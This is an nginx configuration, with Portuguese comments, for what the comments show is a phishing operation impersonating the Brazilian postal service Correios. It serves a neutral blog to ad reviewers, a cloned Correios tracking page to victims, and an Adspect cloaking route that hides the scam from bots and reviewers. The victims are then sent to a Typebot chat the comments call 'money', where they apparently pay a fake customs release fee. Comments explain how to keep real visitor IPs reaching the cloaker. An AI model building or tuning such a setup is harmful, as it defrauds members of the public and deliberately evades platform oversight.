server {
    listen 80 default_server;
    root /var/www/html;
    index presell.html;
    charset utf-8;
    server_tokens off;

    # RAIZ = presell.html (blog editorial NEUTRO — o que o revisor vê primeiro).
    location = / {
        try_files /presell.html =404;
    }

    # /consulta/ = página dos Correios (clone CRR, pós-clique na presell).
    # Usuário vem da presell (CTA "Acessar área de acompanhamento") -> digita código
    # -> "Pagar Liberação" -> /go/ (Adspect) -> /chat/ (Typebot).
    # Path público (não cloakado); assets relativos ./css/ resolvem em /consulta/css/.
    location /consulta/ {
        try_files $uri $uri/ /consulta/index.html;
    }

    # Evita expor phpinfo() de qualquer index.php default da base na raiz.
    location = /index.php {
        return 301 /;
    }

    # CTA "Pagar Liberação" -> go/index.php (roteamento Adspect).
    # Sub-recursos de /go/ caem no PHP.
    location /go/ {
        index index.php;
        try_files $uri /go/index.php?$query_string;
    }

    # Entry da money: /chat/ carrega embed Typebot (chat/index.html).
    # O typebot-standard web component puxa chat.rastreiofacil.cfd/<publicId>.
    location /chat/ {
        index index.html;
        try_files $uri $uri/ /chat/index.html;
    }

    # /rastreio/ = tela de acompanhamento embutida pelo Typebot (iframe). Página
    # PRÓPRIA e limpa (sem domínio de terceiro). noindex.
    location /rastreio/ {
        index index.html;
        try_files $uri $uri/ /rastreio/index.html;
        add_header X-Robots-Tag "noindex, nofollow" always;
    }

    # safe.html (blog) = pra onde o Adspect manda bot/revisor/datacenter.
    # Demais páginas do blog (artigos editoriais, legais) servidos como estáticos.
    location / {
        try_files $uri $uri/ =404;
    }

    # PHP: so go/index.php (Adspect). Money nao usa mais PHP (HTML estatico).
    location ~ \.php$ {
        fastcgi_pass 127.0.0.1:9000;
        fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
        # OBRIGATORIO com Bunny: Bunny seta X-Real-IP = IP real; Traefik appenda o
        # IP do no Bunny ao X-Forwarded-For. Adspect checa CF-Connecting-IP primeiro.
        # Sem isto, 100% do trafego cai no safe (0 money).
        fastcgi_param HTTP_CF_CONNECTING_IP $http_x_real_ip;
        include fastcgi_params;
        fastcgi_read_timeout 30;
    }

    location ~ /\. {
        deny all;
    }
}
